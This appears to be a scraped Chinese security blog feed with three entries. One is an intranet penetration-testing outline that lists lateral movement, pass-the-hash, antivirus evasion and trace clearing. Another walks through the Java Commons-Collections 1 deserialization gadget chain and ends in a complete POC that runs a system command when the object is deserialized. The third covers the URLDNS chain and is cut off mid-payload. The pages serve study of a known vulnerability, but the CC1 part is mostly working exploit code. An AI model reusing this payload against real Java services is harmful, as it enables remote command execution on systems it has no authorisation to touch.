        <content type="html"><![CDATA[<h1 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h1><p>内网渗透测试的目标一般是获取特定机器的权限或者特定用户，进而获得特定的资源，对内网的安全性进行评估。</p><h1 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h1><p>本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。</p><h1 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h1><p>获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。</p><h1 id="域内基础信息收集"><a href="#域内基础信息收集" class="headerlink" title="域内基础信息收集"></a>域内基础信息收集</h1><ul><li>主机</li><li>用户和用户组</li><li>计算机列表</li><li>密码策略</li><li>域控</li><li>域管理员</li><li>域管理进程</li><li>核心业务机器</li><li>敏感文件</li><li>域内网段划分情况及拓扑结构</li></ul><h1 id="构建隧道"><a href="#构建隧道" class="headerlink" title="构建隧道"></a>构建隧道</h1><ul><li>判断内网连通性构建相应隧道</li><li>端口转发</li></ul><p><strong>遵循三个原则</strong></p><ol><li><strong>稳定性</strong>（主要用于扫描）{ 支持高并发、自动断线重连 }</li><li><strong>安全性</strong>（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }</li><li><strong>健壮性</strong> { 支持多种协议方式、最好支持插件定制 }</li></ol><h1 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h1><p>在进行域内存活主机探测的时候，有几个注意点：</p><ul><li>尽量避免触发域内的一些防病毒软件的告警和拦截；</li><li>在非授权情况下，避免使用工具进行暴力扫描；</li><li>尽量避免在目标机子上使用图形化工具；</li><li>尽量使用系统自带的工具进行探测，如powershell脚本；</li></ul><h1 id="域内存活主机端口扫描"><a href="#域内存活主机端口扫描" class="headerlink" title="域内存活主机端口扫描"></a>域内存活主机端口扫描</h1><p>一般端口扫描需要关注如下三点：</p><ul><li>端口的Banner信息；</li><li>端口上运行的服务；</li><li>常见服务的默认端口号；</li></ul><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><ul><li>各种收集到的凭证</li><li>弱口令，密码喷洒</li><li>常见Web，主机漏洞</li><li>hash传递攻击</li></ul><h1 id="辅助"><a href="#辅助" class="headerlink" title="辅助"></a>辅助</h1><ul><li>免杀</li><li>权限提升</li><li>权限维持</li><li>痕迹清理</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之CC1-TransFormed</title>
      <link href="/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1-TransFormed/"/>
      <url>/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1-TransFormed/</url>
      
        <content type="html"><![CDATA[<h2 id="CC1-TransFormed-chains"><a href="#CC1-TransFormed-chains" class="headerlink" title="CC1-TransFormed chains"></a>CC1-TransFormed chains</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>java&lt;8u71</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><strong>Demo</strong></p><p><img src="/../images/image-20230923145638448.png" alt="image-20230923145638448"></p><p>关键点</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 能够任意命令执行的点</span></span><br><span class="line">InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类使用了反射，并且反射的参数可控，可以⽤来执⾏任意⽅法。</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230923155216854.png" alt="image-20230923155216854"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 手动调用InvokerTransformer的transfrom方法来执行命令</span></span><br><span class="line">Runtime runtime = Runtime.getRuntime();</span><br><span class="line">new InvokerTransformer(<span class="string">&quot;exec&quot;</span>,new Class[]&#123;String.class&#125;,new Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>Demo代码解释</p><ul><li><p>构造回调链</p><p><img src="/../images/image-20230923195149097.png" alt="image-20230923195149097"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//直接返回当前环境的Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line"></span><br><span class="line">                <span class="comment">//第⼀个参数是待执⾏的⽅法名（哪个类的方法名？前一个回调函数返回的结果即ConstantTransformer返回的对象）</span></span><br><span class="line">                <span class="comment">//第⼆个参数是这个函数的参数列表的参数类型</span></span><br><span class="line">                <span class="comment">//第三个参数是传给这个函数的参数列表</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;</span><br><span class="line">                        ),</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">//将内部的多个Transformer串在⼀起，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure></li><li><p>修饰Map</p><blockquote><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map<strong>在添加新的元素时，将可以执⾏⼀个回调</strong>。</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//修饰Map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">    innerMap,</span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    transformerChain</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>触发回调最后执行Runtime对象的exec方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//触发回调</span></span><br><span class="line">outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);     </span><br></pre></td></tr></table></figure></li></ul><p><strong>POC</strong></p><p>通过上面的Demo我们可知链子的尾巴在<code>InvokerTransformer</code>的<code>transfrom</code>方法,往回找</p><p><img src="/../images/db55d9439c95d5cda0646b0be1180bfa.png" alt="image-20220114111551082"></p><p><img src="/../images/image-20230923165556436.png" alt="image-20230923165556436"></p><p>查看 TranformedMap 的构造方法，因为是 protected 属性无法调用，寻找到一个静态方法调用了构造方法</p><p><img src="/../images/98896b69dec504c41a332c33936d02ef.png" alt="image-20220114130017028"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//使用静态方法decorate来调用构造函数</span></span><br><span class="line">TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure><p>找谁调用了<code>checkSetValue</code></p><p><img src="/../images/image-20230923170844418.png" alt="image-20230923170844418"></p><p><code>MapEntry</code>的<code>setValue</code>是用于遍历HashMap的。所以只需要遍历一个Map就可以触发这个<code>setValue</code>方法。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"><span class="keyword">for</span> (Map.Entry entry: transformedMap.entrySet()) &#123;</span><br><span class="line"><span class="comment">// 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform</span></span><br><span class="line">entry.setValue(runtime);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续找谁调用了<code>setValue</code>，这里刚好有一个在<code>readObject</code>里调用了<code>setValue</code>的</p><p><img src="/../images/image-20230923173037421.png" alt="image-20230923173037421"></p><p><img src="/../images/image-20230923173551302.png" alt="image-20230923173551302"></p><p><img src="/../images/image-20230923173506439.png" alt="image-20230923173506439"></p><p>并且从该类的构造函数可以知道<code>memberValues</code>是可控的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"><span class="comment">//        for (Map.Entry entry: transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//类没有注明类型，默认为 default，即只能在本包内使用，所以需要用反射调用执行</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationdhlConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhlConstructor.newInstance(Override.class, transformedMap);</span><br></pre></td></tr></table></figure><p>现在有两个问题</p><ol><li><p>Runtime 类不可以被序列化，没有继承 serializable 接口，反射获取并转换为Transformer写法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先需要获得Runtime类的Class实例</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="comment">//获得Runtime类的getRuntime方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getruntime</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用该方法获得Runtime对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getruntime.invoke(clz);</span><br><span class="line"><span class="comment">//获得Runtime类的exec方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> clz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line"><span class="comment">//调用exec方法执行命令</span></span><br><span class="line">exec.invoke(runtime,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure></li><li><p>if条件</p><blockquote><p>这部分是注解的知识</p></blockquote><p><img src="/../images/image-20230923190120874.png" alt="image-20230923190120874"></p><blockquote><ol><li><p>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法,方法名为value</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure></li><li><p>被 TransformedMap.decorate 修饰的Map中必须有一个键名为value的元素</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230923190034704.png" alt="image-20230923190034704"></p></li></ol></blockquote></li><li><p>类不可控</p><p><img src="/../images/image-20230923190148131.png" alt="image-20230923190148131"></p><p>需要控制setvalue的参数为Runtime对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class) <span class="comment">//输入啥对象返回啥对象</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>最终payload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        手动触发setvalue</span></span><br><span class="line"><span class="comment">//        for (Map.Entry entry: transformedMap.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            // 调用 SetValue，SetValue 中调用了 checkSetValue，checkSetValue 调用了 transform</span></span><br><span class="line"><span class="comment">//            entry.setValue(runtime);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//类没有注明类型，默认为 default，即只能在本包内使用，所以需要用反射调用执行</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationdhlConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationInvocationdhlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// Target 注解类型</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationdhlConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230923191819061.png" alt="image-20230923191819061"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">我们构造恶意的AnnotationInvocationHandler类，将该类的成员变量memberValues赋值为我们精心构造的TransformedMap对象，并将AnnotationInvocationHandler类进行序列化，然后交给目标JAVA WEB应用进行反序列化。在进行反序列化时，会执行readObject()方法，该方法会对成员变量TransformedMap的Value值进行修改，该修改触发了TransformedMap实例化时传入的参数InvokerTransformer的transform()方法，InvokerTransformer.transform()方法通过反射链调用Runtime.getRuntime.exec(“xx”)函数来执行系统命令。</span><br></pre></td></tr></table></figure><p><strong>不要找同名函数调用陷入循环</strong></p><p><strong>如果类没有注明类型，默认为 default，即只能在本包内使用，需要用反射调用执行</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之URLDNS</title>
      <link href="/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE/"/>
      <url>/2023/05/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h1><p><a href="https://cloud.tencent.com/developer/article/1887019">IDEA中的debug断点调试技巧，学会真的香！ - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">(72条消息) IntelliJ IDEA创建Servlet最新方法 Idea版本2020.2.2以及IntelliJ IDEA创建Servlet 404问题（超详细）_idea创建servlet项目_Granger_g的博客-CSDN博客</a></p><h2 id="ysoserial-调试"><a href="#ysoserial-调试" class="headerlink" title="ysoserial 调试"></a>ysoserial 调试</h2><p>下载源码，等待maven导入依赖，再配置如下即可（java版本为java8）</p><p><img src="/../images/image-20230502220543589.png" alt="image-20230502220543589"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>​在java中，如果要对一个对象进行序列化或者反序列化，那么这个对象的类必须要实现<code>java.io.Serializable</code>接口。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>序列化<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line"></span><br><span class="line">oos.writeObject(obj);</span><br></pre></td></tr></table></figure><p>反序列化<code>readObject</code> </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br></pre></td></tr></table></figure><h3 id="创建一个对象时各代码块的执行顺序"><a href="#创建一个对象时各代码块的执行顺序" class="headerlink" title="创建一个对象时各代码块的执行顺序"></a>创建一个对象时各代码块的执行顺序</h3><p><img src="/../images/image-20230503114055054.png" alt="image-20230503114055054"></p><p><code>static &#123;&#125;</code>  →  <code>&#123;&#125;</code>  →  构造函数</p><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p>反序列时, 如果字节流中的serialVersionUID与目标服务器对应类中的serialVersionUID不同时就会出现异常，造成反序列化失败。</p><p><img src="/../images/1615523079000-30cnxtq.png-w331s" alt="图片"></p><p>SUID不同是jar包版本不同所造成，不同版本jar包可能存在不同的计算方式导致算出的SUID不同，这种情况下只需要基于目标一样的jar包版本去生成payload即可解决异常，进而提升反序列化漏洞利用成功率。</p><h3 id="反序列化数据标志"><a href="#反序列化数据标志" class="headerlink" title="反序列化数据标志"></a>反序列化数据标志</h3><p><code>AC ED 00 05</code></p><p><img src="/../images/image-20230913163905803.png" alt="image-20230913163905803"></p><h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>分析的时候发现需要注释掉<code>ysoserial</code>重写的<img src="/../images/image-20230502230402644.png" alt="image-20230502230402644"></p><blockquote><p>ysoserial为了防⽌在⽣成Payload的时候也执⾏了URL请求和DNS查询，所以重写了⼀ 个 SilentURLStreamHandler 类。</p></blockquote><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><p>如何寻找可能具有反序列化漏洞的类？</p><p>要有<code>readObject</code>方法，所以直奔<code>HashMap</code>的<code>readObject</code>方法</p><p><img src="/../images/image-20230502233642388.png" alt="image-20230502233642388"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>在<code>ysoserial</code>中打下断点</p><p><img src="/../images/image-20230502233910801.png" alt="image-20230502233910801"></p><p>跟进<code>put</code></p><p><img src="/../images/image-20230502233952861.png" alt="image-20230502233952861"></p><p>跟进<code>hash</code></p><p><img src="/../images/image-20230502234020014.png" alt="image-20230502234020014"></p><p>跟进<code>hashCode</code></p><p><img src="/../images/image-20230502234105324.png" alt="image-20230502234105324"></p><p>跟进<code>handler.hashCode</code></p><p><img src="/../images/image-20230502234135313.png" alt="image-20230502234135313"></p><p>跟进<code>getHostAddress</code></p><p><img src="/../images/image-20230502235424673.png" alt="image-20230502235424673"></p><p>这里多了一步，可能是版本问题吧？</p><p><img src="/../images/image-20230502234312446.png" alt="image-20230502234312446"></p><p>这⾥ InetAddress.getByName(host) 的作用是根据主机名，获取其IP地址，在网络上其实就是⼀次 DNS查询。</p><p><code>Gadget Chain</code></p><p><img src="/../images/image-20230502234635733.png" alt="image-20230502234635733"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash()</span><br><span class="line">URL.hashCode()：Field hashCode=-<span class="number">1</span></span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress()</span><br><span class="line">URL-&gt;getHostAddress()    </span><br><span class="line">InetAddress-&gt;getByName()</span><br></pre></td></tr></table></figure><p>需要实例化三个类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap</span><br><span class="line">URLStreamHandler</span><br></pre></td></tr></table></figure><p>无参构造，直接<code>new</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">URL</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230503000931008.png" alt="image-20230503000931008"></p><p>payload</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNSTestDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span 